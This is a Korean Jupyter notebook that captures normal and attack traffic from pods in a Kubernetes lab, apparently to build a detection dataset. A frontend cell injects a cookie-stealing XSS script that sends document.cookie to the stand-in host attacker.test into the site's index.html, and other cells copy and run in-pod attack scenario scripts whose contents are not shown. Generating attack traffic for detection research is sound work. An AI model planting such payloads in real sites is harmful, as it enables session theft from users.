# 트래픽 수집

정상 트래픽은 학습용과 테스트용으로 나누고, 공격 트래픽은 시나리오별로 수집한다.
Pod에서 나가는 패킷을 PCAP으로 저장한 뒤 dev-server로 회수한다.

준비: dev-server의 `~/k8s-cluster`, `~/locust`와 실행 중인 `deepmesh` 클러스터.

## 접속 및 수집 설정

In [ ]:
import base64, shlex, getpass, time
import paramiko

DEV_HOST = input("dev-server Tailscale IP/host: ").strip()
DEV_USER = input("dev-server user: ").strip()
DEV_PASS = getpass.getpass("dev-server password: ")

def _dev_client():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(DEV_HOST, username=DEV_USER, password=DEV_PASS, timeout=15)
    return c

def dev_run(cmd, timeout=None):
    """dev-server에서 명령을 실행한다."""
    c = _dev_client()
    try:
        stdin, stdout, stderr = c.exec_command(cmd, timeout=timeout, get_pty=True)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
    finally:
        c.close()
    print(out)
    if err.strip():
        print("[stderr]", err)
    return out

def node_run(vm, cmd, timeout=None):
    """Vagrant VM에서 명령을 실행한다."""
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = f"echo {b64} | base64 -d | bash"
    vg = f"cd ~/k8s-cluster && vagrant ssh {vm} -c {shlex.quote(inner)}"
    return dev_run(vg, timeout=timeout)

_ = dev_run("echo dev-server OK")
_ = node_run("k8s-master", "echo master OK")

In [ ]:
NS = "deepmesh"
LOCUST_MASTER = "/home/vagrant/locust"
FIND_LOCUST = "dirname \"$(find /vagrant /home/vagrant -maxdepth 4 -name run.sh 2>/dev/null | head -1)\""

MAIN_CTR = {
    "auth": "auth-service", "post": "post-service", "comment": "comment-service",
    "frontend": "frontend", "mysql": "mysql",
}
ROUNDS = 3
CAP_SEC = {"benign": 2700, "test": 1000, "attack_easy": 400, "attack_hard": 600, "attack_prog": 1200}
STAGE_SEC = 2700
BENIGN_USERS = {"auth": 40, "post": 40, "comment": 40, "frontend": 40}
CORPUS = dict(USERS=3, POSTS=300, COMMENTED=100, PER=3)
CAP_SESS = "cap"

print(f"수집 설정: {ROUNDS}라운드, 단계당 {STAGE_SEC}초, 사용자 {BENIGN_USERS}")

In [ ]:
def upload(vm):
    cmd = (f"cd ~/k8s-cluster && "
           f"vagrant ssh {vm} -c 'rm -rf /home/vagrant/locust' && "
           f"vagrant upload /home/{DEV_USER}/locust /home/vagrant/locust {vm}")
    return dev_run(cmd, timeout=300)

dev_run("find /home/%s/locust -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null; echo cleaned" % DEV_USER)

for vm in ["k8s-master", "k8s-worker1", "k8s-worker2", "k8s-worker3"]:
    print(f"[upload] {vm}")
    upload(vm)

## Pod 탐색 및 캡처 준비

In [ ]:
def rediscover_pods():
    """실행 중인 Pod의 이름, IP, 노드를 갱신한다."""
    cmd = ("echo '===PODS==='; "
           f"kubectl -n {NS} get pods "
           "-o custom-columns=NAME:.metadata.name,IP:.status.podIP,NODE:.spec.nodeName,PH:.status.phase "
           "--no-headers; echo '===END==='")
    out = node_run("k8s-master", cmd)
    body = out.split("===PODS===")[-1].split("===END===")[0]
    want = {"auth":"auth-service","post":"post-service","comment":"comment-service",
            "frontend":"frontend","mysql":"mysql-0"}
    newpod = {}
    for line in body.strip().splitlines():
        p = line.split()
        if len(p) < 4 or p[3] != "Running" or p[1] in ("<none>",""): continue
        name, ip, node = p[0], p[1], p[2]
        for svc, pref in want.items():
            if name.startswith(pref) and svc not in newpod:
                newpod[svc] = (name, ip, node)
    missing = [s for s in want if s not in newpod]
    if missing:
        raise RuntimeError(f"실행 중인 Pod를 찾지 못했습니다: {missing}")
    globals()["POD"] = newpod
    for s,(n,ip,nd) in newpod.items():
        print(f"  {s:9} {ip:16} {nd:12} {n}")
    return newpod

def restart_app_pods(wait=210):
    """auth, post, comment를 재시작해 새 DB 연결을 만든다."""
    deps = "deployment/auth-service deployment/post-service deployment/comment-service"
    node_run("k8s-master", f"kubectl -n {NS} rollout restart {deps}")
    node_run("k8s-master", f"kubectl -n {NS} rollout status {deps} --timeout={wait}s")
    time.sleep(5)
    return rediscover_pods()

_ = rediscover_pods()

In [ ]:
SQ = chr(39)

GET_PID = (
  'CTR="sudo $(sudo find / -maxdepth 6 -name ctr 2>/dev/null | head -1) -n k8s.io"; '
  'get_pid(){ for cid in $($CTR containers ls | awk -v i="$1" '
  + SQ + '$2 ~ i {print $1}' + SQ + '); do '
  '$CTR task ls | awk -v c="$cid" '
  + SQ + '$1==c && $3=="RUNNING"{print $2}' + SQ + '; done | head -1; }'
)

def cap_start(svc, out_path, sec, name_filter=None, snaplen=0):
    """Pod의 송신 패킷을 캡처한다. snaplen=0이면 전체 패킷을 저장한다."""
    pod_name, pod_ip, node = POD[svc]
    match = name_filter or svc
    sess = f"{CAP_SESS}_{svc}"
    cmd = (
      f'{GET_PID}; '
      f'PID=$(get_pid "{match}"); echo "pid=$PID ip={pod_ip}"; '
      f'mkdir -p "$(dirname {shlex.quote(out_path)})"; '
      f'sudo nsenter -t "$PID" -n ethtool -K eth0 gro off tso off gso off lro off 2>/dev/null || true; '
      f'tmux kill-session -t {sess} 2>/dev/null || true; '
      f'tmux new-session -d -s {sess} '
      f'"sudo timeout {sec} nsenter -t $PID -n tcpdump -i eth0 -s {snaplen} \\"tcp and src host {pod_ip}\\" -w {out_path}"; '
      f'sleep 1; tmux ls 2>/dev/null | grep {sess} && echo STARTED'
    )
    print(f"[capture] {svc}: {out_path} ({node}, src={pod_ip})")
    return node_run(node, cmd)

def cap_stop(svc):
    """Pod의 캡처 프로세스와 tmux 세션을 종료한다."""
    pod_name, pod_ip, node = POD[svc]
    sess = f"{CAP_SESS}_{svc}"
    cmd = (f'tmux kill-session -t {sess} 2>/dev/null; '
           f'sudo pkill -f "tcpdump.*src host {pod_ip}" 2>/dev/null; echo STOPPED {svc}')
    return node_run(node, cmd)

print("캡처 함수 준비 완료")

In [ ]:
for vm in ("k8s-worker1", "k8s-worker2"):
    print(f"[loadgen] {vm}")
    node_run(
        vm,
        "python3 -m venv ~/loadgen 2>/dev/null; source ~/loadgen/bin/activate; "
        "pip install -q locust requests 2>/dev/null; "
        "pip show locust | grep -E '^(Name|Version)' && echo LOCUST_OK",
    )

## 테스트 데이터 준비

기존 사용자·게시글·댓글을 비우고 수집에 사용할 데이터를 생성한다.

In [ ]:
TRUNCATE_SQL = ("SET FOREIGN_KEY_CHECKS=0;TRUNCATE auth_db.refresh_tokens; TRUNCATE auth_db.users;TRUNCATE posts_db.posts;TRUNCATE comments_db.comments;SET FOREIGN_KEY_CHECKS=1;SELECT (SELECT COUNT(*) FROM auth_db.users) users,(SELECT COUNT(*) FROM posts_db.posts) posts,(SELECT COUNT(*) FROM comments_db.comments) comments;")
node_run("k8s-master",
  f'kubectl -n {NS} exec -i mysql-0 -- sh -c \'mysql -uroot -p"$MYSQL_ROOT_PASSWORD" -e "{TRUNCATE_SQL}"\'')
import base64 as _b64

SEED_PY = r"""
import os, sys, uuid, logging, secrets
import requests

logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger("seed")

AUTH_HOST = os.environ.get("AUTH_HOST", "http://localhost:8080")
POST_HOST = os.environ.get("POST_HOST", "http://localhost:8080")
COMMENT_HOST = os.environ.get("COMMENT_HOST", "http://localhost:8080")

N_USERS = int(os.environ.get("CORPUS_USERS", "3"))
N_POSTS = int(os.environ.get("CORPUS_POSTS", "300"))
N_COMMENTED = int(os.environ.get("CORPUS_COMMENTED_POSTS", "100"))
N_PER = int(os.environ.get("CORPUS_COMMENTS_PER", "3"))
PREFIX = os.environ.get("CORPUS_USER_PREFIX", "corpus")
PASSWORD = secrets.token_urlsafe(24) + "Aa1!"
TIMEOUT = 15

def signup_login(username):
    try:
        requests.post(f"{AUTH_HOST}/api/auth/signup",
                      json={"username": username, "password": PASSWORD}, timeout=TIMEOUT)
    except Exception as e:
        log.warning("[signup] %s: %s", username, e)
    try:
        r = requests.post(f"{AUTH_HOST}/api/auth/login",
                          json={"username": username, "password": PASSWORD}, timeout=TIMEOUT)
        if r.ok:
            return r.json().get("accessToken")
        log.warning("[login] %s status=%s", username, r.status_code)
    except Exception as e:
        log.warning("[login] %s: %s", username, e)
    return None

def create_post(token, i):
    h = {"Authorization": f"Bearer {token}"}
    body = {"title": f"Corpus Post {i}",
            "content": f"Corpus seed content for post {i} - {uuid.uuid4().hex}"}
    try:
        r = requests.post(f"{POST_HOST}/api/posts", json=body, headers=h, timeout=TIMEOUT)
        if r.ok:
            return r.json().get("postId")
        log.warning("[post %d] status=%s", i, r.status_code)
    except Exception as e:
        log.warning("[post %d] %s", i, e)
    return None

def create_comment(token, pid, j):
    h = {"Authorization": f"Bearer {token}"}
    body = {"content": f"Corpus comment {j} on post {pid} - {uuid.uuid4().hex[:8]}"}
    try:
        r = requests.post(f"{COMMENT_HOST}/api/comments/{pid}/comments",
                          json=body, headers=h, timeout=TIMEOUT)
        if r.ok:
            return True
        log.warning("[comment p%s #%d] status=%s", pid, j, r.status_code)
    except Exception as e:
        log.warning("[comment p%s #%d] %s", pid, j, e)
    return False

def main():
    users = []
    for _ in range(max(1, N_USERS)):
        uname = f"{PREFIX}_{uuid.uuid4().hex[:10]}"
        tok = signup_login(uname)
        if tok:
            users.append((uname, tok))
    if not users:
        log.error("seed 유저 생성 실패 - AUTH_HOST(%s) 확인", AUTH_HOST)
        sys.exit(1)
    log.info("seed users: %d (prefix=%s_)", len(users), PREFIX)

    post_ids = []
    for i in range(N_POSTS):
        _, tok = users[i % len(users)]
        pid = create_post(tok, i)
        if pid:
            post_ids.append(pid)
        if (i + 1) % 50 == 0:
            log.info("  posts %d/%d", i + 1, N_POSTS)
    log.info("posts created: %d/%d", len(post_ids), N_POSTS)

    n_comments = 0
    for k, pid in enumerate(post_ids[:N_COMMENTED]):
        _, tok = users[k % len(users)]
        for j in range(N_PER):
            if create_comment(tok, pid, j):
                n_comments += 1
    log.info("comments created: %d (on %d posts x %d)",
             n_comments, min(N_COMMENTED, len(post_ids)), N_PER)
    log.info("[seed done] users=%d posts=%d comments=%d", len(users), len(post_ids), n_comments)

if __name__ == "__main__":
    main()
"""

auth_ip, post_ip, comment_ip = POD["auth"][1], POD["post"][1], POD["comment"][1]
_blob = _b64.b64encode(SEED_PY.encode()).decode()
seed_cmd = (
    f"echo {_blob} | base64 -d > /tmp/seed_corpus.py; "
    f"source ~/loadgen/bin/activate; "
    f"AUTH_HOST=http://{auth_ip}:8080 POST_HOST=http://{post_ip}:8080 COMMENT_HOST=http://{comment_ip}:8080 "
    f"CORPUS_USERS={CORPUS['USERS']} CORPUS_POSTS={CORPUS['POSTS']} "
    f"CORPUS_COMMENTED_POSTS={CORPUS['COMMENTED']} CORPUS_COMMENTS_PER={CORPUS['PER']} "
    f"python3 /tmp/seed_corpus.py"
)
node_run("k8s-worker1", seed_cmd, timeout=1200)

## DB 스냅샷

준비한 데이터를 저장한다. 수집을 마친 뒤 이 상태로 복원한다.

In [ ]:
_ = node_run("k8s-master", f"cd {LOCUST_MASTER} && bash run.sh snapshot")
print("DB 스냅샷 저장 완료")

## 학습용 정상 트래픽

서비스별로 부하를 생성한다. 라운드 사이에 앱 Pod를 재시작해 DB 연결을 새로 만든다.

In [ ]:
def run_benign_round(R):
    BROOT = f"/vagrant/result/benign/round{R}"
    node_run("k8s-worker1", f"mkdir -p {BROOT}; echo mk {BROOT}")
    a,p,c,fe = POD["auth"][1], POD["post"][1], POD["comment"][1], POD["frontend"][1]
    PEER = (f'AUTH_HOST=http://{a}:8080 POST_HOST=http://{p}:8080 COMMENT_HOST=http://{c}:8080 '
            f'AUTH_POD={a} POST_POD={p} COMMENT_POD={c} FRONTEND_POD={fe}')
    STAGES = [("auth","auth-service",96,f"http://{a}:8080","benign/auth_locustfile.py",BENIGN_USERS["auth"]),
              ("post","post-service",200,f"http://{p}:8080","benign/post_locustfile.py",BENIGN_USERS["post"]),
              ("comment","comment-service",200,f"http://{c}:8080","benign/comment_locustfile.py",BENIGN_USERS["comment"]),
              ("frontend","frontend",200,f"http://{fe}:80","benign/frontend_locustfile.py",BENIGN_USERS["frontend"])]
    for svc,nf,snap,host,lf,users in STAGES:
        print(f"\n[benign {R}/{ROUNDS}] {svc}: {STAGE_SEC}초, 사용자 {users}")
        cap_start(svc, f"{BROOT}/benign_{svc}.pcap", STAGE_SEC+60, name_filter=nf, snaplen=snap)
        if svc == "auth":  # MySQL은 모든 단계에서 캡처한다.
            cap_start("mysql", f"{BROOT}/benign_mysql.pcap", STAGE_SEC*len(STAGES)+120,
                      name_filter="mysql", snaplen=96)
        load = (f'source ~/loadgen/bin/activate; L=$({FIND_LOCUST}); cd "$L"; {PEER} CACHE_BUST=1 '
                f'locust -f {lf} --host {host} --headless -u {users} -r 6 -t {STAGE_SEC}s '
                f'>/tmp/benign_{svc}.log 2>&1; echo DONE_{svc}')
        node_run("k8s-worker1", load, timeout=STAGE_SEC+180)
        cap_stop(svc)
    cap_stop("mysql")

for R in range(1, ROUNDS+1):
    if R > 1:
        print(f"\n[round {R}] 앱 Pod 재시작")
        restart_app_pods()
    run_benign_round(R)
print(f"정상 트래픽 수집 완료: {ROUNDS}라운드")

## 테스트용 정상 트래픽

앱 Pod를 재시작하고 학습용과 별도로 수집한다.

In [ ]:
TROOT = "/vagrant/result/test/benign"
node_run("k8s-worker1", f"find {TROOT} -name '*.pcap' -delete 2>/dev/null; mkdir -p {TROOT}; echo cleaned")
print("[test benign] 앱 Pod 재시작")
restart_app_pods()
a,p,c,fe = POD["auth"][1], POD["post"][1], POD["comment"][1], POD["frontend"][1]
PEER = (f'AUTH_HOST=http://{a}:8080 POST_HOST=http://{p}:8080 COMMENT_HOST=http://{c}:8080 '
        f'AUTH_POD={a} POST_POD={p} COMMENT_POD={c} FRONTEND_POD={fe}')
TEST_SEC = CAP_SEC["test"]
STAGES = [("auth","auth-service",96,f"http://{a}:8080","benign/auth_locustfile.py",BENIGN_USERS["auth"]),
          ("post","post-service",200,f"http://{p}:8080","benign/post_locustfile.py",BENIGN_USERS["post"]),
          ("comment","comment-service",200,f"http://{c}:8080","benign/comment_locustfile.py",BENIGN_USERS["comment"]),
          ("frontend","frontend",200,f"http://{fe}:80","benign/frontend_locustfile.py",BENIGN_USERS["frontend"])]
for svc,nf,snap,host,lf,users in STAGES:
    print(f"\n[test benign] {svc}: {TEST_SEC}초")
    cap_start(svc, f"{TROOT}/benign_{svc}.pcap", TEST_SEC+60, name_filter=nf, snaplen=snap)
    if svc == "auth":
        cap_start("mysql", f"{TROOT}/benign_mysql.pcap", TEST_SEC*len(STAGES)+120, name_filter="mysql", snaplen=96)
    load = (f'source ~/loadgen/bin/activate; L=$({FIND_LOCUST}); cd "$L"; {PEER} CACHE_BUST=1 '
            f'locust -f {lf} --host {host} --headless -u {users} -r 6 -t {TEST_SEC}s >/tmp/tb_{svc}.log 2>&1; echo DONE_{svc}')
    node_run("k8s-worker1", load, timeout=TEST_SEC+180)
    cap_stop(svc)
cap_stop("mysql")
print("테스트용 정상 트래픽 수집 완료")

## 공격 트래픽

대상 Pod에서 시나리오를 실행하고 송신 패킷을 수집한다. 스크립트와 실행 횟수는 `SCEN`에서 설정한다.

In [ ]:
def inject(target):
    pod_name = POD[target][0]
    cmd = (f"cd {LOCUST_MASTER} && "
           f"kubectl -n {NS} cp attack/inpod {pod_name}:/tmp/atk -c {MAIN_CTR[target]} && "
           f"kubectl -n {NS} exec {pod_name} -c {MAIN_CTR[target]} -- ls /tmp/atk && echo INJECTED")
    return node_run("k8s-master", cmd)
 
inject("post")
inject("comment")
inject("auth")
inject("frontend")
inject("mysql")

AROOT = "/vagrant/result/test/attack"

SCEN = {
  "k1":  ("k8s_enum.sh",                 "attack_easy", "N=50"),
  "k2":  ("k8s_manipulate.sh",           "attack_easy", "DRYRUN=All N=30"),
  "enum_seq":  ("{target}_enum_seq.sh",  "attack_hard", "N=100"),
  "l2":        ("{target}_l2.sh",        "attack_hard", "N=150"),
  "l3":        ("{target}_l3.sh",        "attack_hard", "N=100"),
  "d1":        ("mysql_d1.sh",           "attack_hard", "N=60"),
  "e1":        ("{target}_e1.sh", "attack_hard", "N=80"),
  "c2":        ("{target}_c2.sh", "attack_hard", "N=80"),
  "cred_enum": ("auth_cred_enum.sh",     "attack_hard", "N=100"),
  "scan_seq":  ("frontend_scan_seq.sh",  "attack_hard", "N=120"),
}

def _name_filter(target):
    return {"mysql": "mysql", "frontend": "frontend"}.get(target, f"{target}-service")

def run_attack(target, scen):
    """시나리오 실행 전후로 대상 Pod의 트래픽을 캡처한다."""
    script_tmpl, seckey, env = SCEN[scen]
    script = script_tmpl.format(target=target)
    pod_name, pod_ip, node = POD[target]
    out = f"{AROOT}/attack_{target}_{scen}.pcap"
    sec = CAP_SEC[seckey]
    sess = f"atk_{target}_{scen}"

    cap_start(target, out, sec, name_filter=_name_filter(target))

    peer_env = (f'AUTH_URL=http://{POD["auth"][1]}:8080 '
                f'POST_URL=http://{POD["post"][1]}:8080 '
                f'COMMENT_URL=http://{POD["comment"][1]}:8080 '
                f'MYSQL_HOST={POD["mysql"][1]}')
    inpod = f"{env} {peer_env} timeout -k 10 {sec} sh /tmp/atk/{script}"
    exec_cmd = f"kubectl -n {NS} exec {pod_name} -c {MAIN_CTR[target]} -- sh -c {shlex.quote(inpod)}"
    eb64 = base64.b64encode(exec_cmd.encode()).decode()
    if scen == "d1":
        chk = node_run("k8s-master",
            f"kubectl -n {NS} exec {pod_name} -c {MAIN_CTR[target]} -- sh -c "
            + shlex.quote("{ command -v mysql >/dev/null 2>&1 || [ -x /tmp/atk/mysql ]; } && echo MYSQL_OK || echo NO_MYSQL_CLIENT"))
        if "NO_MYSQL_CLIENT" in chk:
            print(f"[d1] {pod_name}: mysql 클라이언트가 없어 건너뜁니다. 설치 후 다시 실행하세요.")
            print(f"       kubectl -n {NS} cp ./mysql-static {pod_name}:/tmp/atk/mysql -c {MAIN_CTR[target]}")

            cap_stop(target); return
    launch = (f"tmux kill-session -t {sess} 2>/dev/null; rm -f /tmp/{sess}.log; "
              f"tmux new-session -d -s {sess} 'echo {eb64} | base64 -d | bash > /tmp/{sess}.log 2>&1'; "
              f"sleep 3; "
              f"if tmux ls 2>/dev/null | grep -q {sess}; then echo LAUNCHED; "
              f"else echo LAUNCH_ENDED_EARLY; echo '--- in-pod output (tail) ---'; tail -n 15 /tmp/{sess}.log 2>/dev/null; fi")
    print(f"[attack] {target}/{scen} ({script}) -> {out} (sec={sec})")
    node_run("k8s-master", launch, timeout=90)

    time.sleep(sec + 15)

    cap_stop(target)
    node_run("k8s-master",
             f"tmux kill-session -t {sess} 2>/dev/null; "
             f"kubectl -n {NS} exec {pod_name} -c {MAIN_CTR[target]} -- "
             f"sh -c 'pkill -f /tmp/atk 2>/dev/null; pkill -f mitmdump 2>/dev/null; true'; "
             f"echo attack_stopped_{scen}", timeout=120)

print("공격 수집 함수 준비 완료")

In [ ]:
for scen in ["enum_seq","l2","l3","d1","k1","k2"]:
    run_attack("post", scen); run_attack("comment", scen)
for scen in ["cred_enum","d1","k1","k2"]:
    run_attack("auth", scen)
for scen in ["k1","k2","e1","c2"]:
    run_attack("mysql", scen)
run_attack("frontend", "scan_seq")
print("시나리오 수집 완료")

## Frontend 응답 변조

`index.html`에 테스트 스크립트를 삽입하고 응답을 수집한 뒤 원본을 복원한다.

In [ ]:
_ = rediscover_pods()
fe_pod, fe_ip, fe_node = POD["frontend"]
CTR     = MAIN_CTR["frontend"]
WEBROOT = "/usr/share/nginx/html"
R1_OUT  = "/vagrant/result/test/attack/attack_frontend_r1.pcap"
SEC     = CAP_SEC["attack_hard"]

PAYLOAD = '<script>/*r1-xss*/new Image().src="//attacker.test/c?"+document.cookie;</script>\n'
B64 = base64.b64encode(PAYLOAD.encode()).decode()

inject_cmd = (
    f"cd {LOCUST_MASTER} && "
    f"kubectl -n {NS} exec {fe_pod} -c {CTR} -- sh -c "
    f"'test -f {WEBROOT}/index.html.orig || cp {WEBROOT}/index.html {WEBROOT}/index.html.orig' && "
    f"kubectl -n {NS} exec {fe_pod} -c {CTR} -- sh -c "
    f"'echo {B64} | base64 -d > /tmp/r1pre; cat /tmp/r1pre {WEBROOT}/index.html.orig > {WEBROOT}/index.html' && "
    f"kubectl -n {NS} exec {fe_pod} -c {CTR} -- sh -c 'head -c 70 {WEBROOT}/index.html; echo'"
)
print("[r1] 응답 변조 준비")
_ = node_run("k8s-master", inject_cmd, timeout=90)

node_run(fe_node, f"rm -f {R1_OUT}; echo removed_old_r1")
cap_start("frontend", R1_OUT, SEC + 60, name_filter="frontend", snaplen=200)
load = (
    f'source ~/loadgen/bin/activate; L=$({FIND_LOCUST}); cd "$L"; CACHE_BUST=1 '
    f'locust -f benign/frontend_locustfile.py --host http://{fe_ip}:80 --headless -u 20 -r 6 -t {SEC}s '
    f'>/tmp/r1_load.log 2>&1; echo R1_DONE'
)
node_run("k8s-worker1", load, timeout=SEC + 180)
cap_stop("frontend")

node_run("k8s-master",
         f"cd {LOCUST_MASTER} && kubectl -n {NS} exec {fe_pod} -c {CTR} -- sh -c "
         f"'cp {WEBROOT}/index.html.orig {WEBROOT}/index.html && rm -f /tmp/r1pre && echo restored'")
_ = node_run(fe_node, f"echo -n 'attack_frontend_r1.pcap 패킷수: '; tcpdump -r {R1_OUT} 2>/dev/null | wc -l")
print("[r1] 수집 및 HTML 복원 완료")

## DB 복원 및 PCAP 회수

DB를 스냅샷으로 복원하고 각 worker의 PCAP을 dev-server의 `~/pcaps/result/`에 모은다.

In [ ]:
_ = node_run("k8s-master", f"cd {LOCUST_MASTER} && bash run.sh restore")
print("DB 복원 완료")

In [ ]:
recover = r'''
cd ~/k8s-cluster

if [ -d ~/pcaps ] && [ ! -d ~/pcaps.old ]; then
  echo "[backup] ~/pcaps -> ~/pcaps.old"
  mv ~/pcaps ~/pcaps.old
fi
mkdir -p ~/pcaps/result

for VM in k8s-worker1 k8s-worker2 k8s-worker3; do
  vagrant ssh "$VM" -c "sudo chmod -R a+r /vagrant/result 2>/dev/null" 2>/dev/null
  vagrant ssh-config "$VM" > /tmp/$VM.cfg 2>/dev/null || { echo "  $VM ssh-config 실패"; continue; }
  echo "[rsync] $VM"
  rsync -a --info=stats1,progress2 -e "ssh -F /tmp/$VM.cfg" \
    "$VM:/vagrant/result/" ~/pcaps/result/ 2>&1 | tail -6
done


echo "회수된 PCAP 수:"
find ~/pcaps/result -name '*.pcap' -type f | wc -l
'''
_ = dev_run(recover, timeout=1800)